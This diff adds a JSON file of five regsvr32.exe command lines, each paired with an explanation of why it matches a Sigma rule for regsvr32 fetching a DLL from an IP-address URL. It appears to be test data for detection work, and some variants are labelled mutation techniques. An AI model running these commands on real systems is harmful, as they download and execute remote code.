@@ -1,0 +1,22 @@
+[
+  {
+    "output": "regsvr32.exe /i:http://127.0.0.1/some.dll",
+    "explanation": "This command uses the /i flag with an HTTP URL starting with an IP address (127.0.0.1), which matches the Sigma rule's detection pattern for regsvr32 downloading from an IP-based URL."
+  },
+  {
+    "output": "regsvr32.exe -i http://192.168.1.1/script.dll",
+    "explanation": "This command uses the -i flag instead of /i and omits the colon after the flag, but still specifies an HTTP URL with an IP address. This is a valid variation that matches the Sigma rule."
+  },
+  {
+    "output": "regsvr32.exe /i:http://10.0.0.1\\evil.dll",
+    "explanation": "This command uses a backslash in the URL path instead of a forward slash, which is a valid mutation technique. It still matches the Sigma rule's pattern for an IP-based URL."
+  },
+  {
+    "output": "regsvr32.exe /i:https://192.168.0.1/exploit.dll",
+    "explanation": "This command uses HTTPS instead of HTTP and includes a valid IP address in the URL. It matches the Sigma rule's detection criteria."
+  },
+  {
+    "output": "regsvr32.exe /i:http://172.16.0.1/\"malicious.dll\"",
+    "explanation": "This command adds quotes around the DLL filename, which is a safe mutation technique. It still matches the Sigma rule's pattern for an IP-based URL."
+  }
+]
